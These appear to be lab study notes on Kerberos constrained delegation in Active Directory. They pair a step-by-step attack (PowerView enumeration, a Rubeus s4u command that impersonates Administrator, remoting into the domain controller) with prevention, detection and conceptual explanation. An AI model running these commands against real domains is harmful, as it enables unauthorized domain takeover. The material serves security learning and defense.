---
title: 10. Kerberos Constrained Delegation
updated: 2025-08-31 18:58:01Z
created: 2025-08-31 18:23:37Z
---

# **The attack**

## 1\. What’s the Idea?

Kerberos Constrained Delegation means:

- One account (like a web server account) is trusted to act on behalf of other users — but only for certain services (like HTTP or SQL).
    
- If an attacker steals that account, they can say:  
    *“Hi Domain Controller, I am trusted. Please give me a ticket for the Administrator so I can access the HTTP service on the Domain Controller.”*
    
- The Domain Controller will actually give that ticket — even though the attacker doesn’t know the Administrator’s password.
    

So the goal: **Steal a service account → Abuse delegation → Impersonate Administrator → Access Domain Controller.**

* * *

## 2\. Step One: Find Delegation Accounts

We use **PowerView** to see which accounts can do delegation:

`PS> Import-Module .\PowerView-main.ps1PS> Get-NetUser -TrustedToAuth`

Output shows:

- User: `webservice`
    
- Delegation allowed: `http/dc1.eagle.local`
    

That means this account can impersonate others for the HTTP service on DC1 (the Domain Controller).

* * *

## 3\. Step Two: We Already Have the Password

We know the password is `Salas123`.  
But the tool **Rubeus** needs the NTLM hash (RC4 hash), not the cleartext password.

So we convert:

`PS> .\Rubeus.exe hash /password:Salas123`

This gives us:

`rc4_hmac : FCDC65703DD2B0BD789977F1F3ABCDEF`

That’s the NTLM hash we’ll use.

* * *

## 4\. Step Three: Ask for a Fake Ticket

Now we use **Rubeus** to request a Kerberos ticket pretending to be Administrator.

`PS> .\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3ABCDEF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt`

Explanation:

- `/user:webservice` → our stolen account
    
- `/rc4:…` → its password hash
    
- `/impersonateuser:Administrator` → who we want to pretend to be
    
- `/msdsspn:"http/dc1"` → the service we’re allowed to use
    
- `/ptt` → inject the ticket into memory (so Windows thinks we already logged in)
    

If successful, Rubeus prints “Ticket successfully imported!”.

* * *

## 5\. Step Four: Check if the Ticket is There

We list Kerberos tickets with `klist`: `PS> klist`

We should see: `Client: Administrator@EAGLE.LOCALServer: http/dc1@EAGLE.LOCAL`

That means we’re now holding a Kerberos ticket as **Administrator**.

* * *

## 6\. Step Five: Use the Ticket to Log Into DC1

We use PowerShell Remoting to hop onto the Domain Controller: `PS> Enter-PSSession dc1`

Inside the session: `[dc1]: PS> hostnameDC1[dc1]: PS> whoamieagle\administrator`

Boom. We are Administrator on the Domain Controller.

* * *

## 7\. Troubleshooting

- If it doesn’t work, run `klist purge` to clear tickets and try again.
    
- You can also request tickets for other services (like LDAP, CIFS) using `/altservice`.
    

* * *

✅ **End Result:** By abusing constrained delegation, we used a single delegated account to impersonate the domain Administrator and get remote access to the Domain Controller.

* * *

&nbsp;

&nbsp;

# **Prevention (Stopping the Attack Before It Happens)**

Think of it like putting rules on who can borrow your toys (tickets).

### Step One: Mark Sensitive Accounts

- Go to every **important account** (like Domain Admins, service accounts, etc.).
    
- Check the option **Account is sensitive and cannot be delegated**.
    
- This means: *“Nobody can borrow my ticket, even if they try.”*
    

### Step Two: Use the **Protected Users Group**

- Add high-value accounts (Admins, Service Accounts, etc.) to the **Protected Users** group.
    
- Being in this group **automatically blocks delegation**.
    
- ⚠️ But be careful — some apps might break, so test first.
    

### Step Three: Treat Delegation Accounts Like Gold

- If any account is trusted for delegation, **pretend it’s as powerful as an Admin account**.
    
- Protect it with **long, strong, unique passwords** (prevents Kerberoasting).
    
- Limit where it can log in (only on its server, not everywhere).
    

&nbsp;

* * *

# **Detection (Catching the Attack When It Happens)**

Now imagine watching security cameras to see when someone sneaks in with stolen toys.

### Step One: Monitor Behavior

- If **Administrator** usually logs in from computer A at 9 AM,  
    but suddenly logs in from computer B at midnight — that’s suspicious.
    
- Alert on **odd logins** or logins from **unexpected machines**.
    

### Step Two: Use Event Logs (Windows Security Event ID 4624)

- Every successful login creates an **Event ID 4624**.
    
- Check this event’s details.
    
- If you see the **Transited Services** field populated, that’s a clue.
    

&nbsp;

&nbsp;

&nbsp;

## **MORE EXPLANATION**

# What is Kerberos?

Kerberos is an **authentication protocol** used in Active Directory (AD).  
Its job: **prove who you are** without constantly sending your password across the network.

It uses **tickets** (like digital ID cards) issued by a trusted authority (the Key Distribution Center, or KDC).

- **KDC** lives inside a Domain Controller.
    
- It issues two types of tickets:
    
    1.  **TGT (Ticket Granting Ticket)** – proves your identity.
        
    2.  **Service Ticket (ST)** – proves you can access a specific service (like SQL or IIS).
        

* * *

# How normal Kerberos works (no delegation)

Imagine Alice logs into a Windows domain and tries to access a SQL database.

1.  **Login**:  
    Alice enters her password → DC verifies → DC gives Alice a **TGT**.
    
    - TGT = “I am Alice” (valid for a few hours).
2.  **Access SQL**:  
    Alice wants SQL data → she asks the KDC for a **Service Ticket** to SQL.  
    KDC gives her a ticket: “Alice is allowed to access SQL”.
    
3.  **SQL Verification**:  
    Alice presents the Service Ticket to SQL.  
    SQL trusts the KDC → sees Alice is authenticated → grants access.
    

✅ Done. Alice talks directly to SQL.

* * *

# The Problem

Now let’s add a **web application (IIS)** in front of SQL:

- Alice connects to the **IIS web server**.
    
- IIS needs to fetch Alice’s data from **SQL**.
    

❌ Problem: SQL sees requests coming from IIS, not Alice.  
By default, IIS only has *its own* Kerberos ticket, not Alice’s.  
This is called the **double-hop problem** (one hop = Alice → IIS, second hop = IIS → SQL).

* * *

# What is Kerberos Delegation?

Kerberos Delegation solves the double-hop problem by letting **IIS impersonate Alice** when talking to SQL.

**Instead of IIS saying:**   “I’m IIS, please give me Alice’s data”

**It can say:**    “Here’s Alice’s ticket, I’m asking on her behalf”

SQL then believes the request comes from Alice herself.

* * *

# Types of Delegation

1.  **Unconstrained Delegation**
    
    - IIS can reuse Alice’s ticket to talk to *any* service (SQL, file servers, Exchange, etc).
        
    - Dangerous: if IIS is hacked, attacker can impersonate Alice everywhere.
        
2.  **Constrained Delegation**
    
    - Admins specify which services IIS can delegate to (e.g., only SQL).
        
    - Safer and more commonly used.
        
3.  **Resource-Based Constrained Delegation (RBCD)**
    
    - The target service (SQL) controls who can delegate to it.
        
    - More flexible and secure in modern AD setups.
        

* * *

# Example Walkthrough with Delegation

1.  Alice logs in → gets TGT.
    
2.  Alice connects to IIS → presents her TGT.  
    IIS gets a Service Ticket for itself (IIS).
    
3.  IIS wants to query SQL **as Alice**.
    
    - With delegation enabled, IIS requests a **Service Ticket for SQL on behalf of Alice**.
4.  KDC issues a Service Ticket: “Alice → SQL, via IIS”.
    
5.  IIS sends that ticket to SQL.  
    SQL sees Alice’s identity, not IIS.  
    ✅ Alice’s data is returned.
    

* * *

# Step 7: Analogy

Think of it like a hotel:

- Alice checks in at the **front desk** (KDC) → gets a **wristband (TGT)**.
    
- To use the **gym (SQL)**, Alice needs a **gym pass (Service Ticket)**.
    
- But Alice goes through a **concierge (IIS web app)** who books services on her behalf.
    
- With **delegation**, the concierge can take Alice’s wristband and get her gym pass — so when he shows up, the gym thinks Alice is there.
    

* * *

## Roles in Action

| **Role** | **Example** | **What it Does** | **Delegation Role** |
| --- | --- | --- | --- |
| **User Account** | Alice (`alice@domain.com`) | Authenticates to domain and requests access to resources | Identity being delegated |
| **Service Account** | IIS web app account (`svc_iis_app` or `WEBAPP01$`) | Runs the web application, receives user requests | Trusted for delegation, impersonates Alice |
| **Service (Target Resource)** | SQL Server (`sqlsvc01`) | Hosts the database and enforces permissions | Accepts delegated ticket, applies Alice’s rights |

## Example in AD Terms

| **Flow Step** | **Who/What** | **Account or SPN** | **Action** |
| --- | --- | --- | --- |
| 1   | User | `alice@domain.com` | Logs in, gets TGT |
| 2   | Service Account (Web App) | `svc_iis_app` | Trusted for delegation, receives Alice’s request |
| 3   | Target Service (SQL) | SPN: `MSSQLSvc/sql01.domain.com` (runs as `svc_sql`) | Accepts delegated ticket from IIS |
| 4   | Flow | `Alice → IIS (svc_iis_app) → [delegated ticket] → SQL (svc_sql)` | SQL sees Alice, not IIS |

&nbsp;

&nbsp;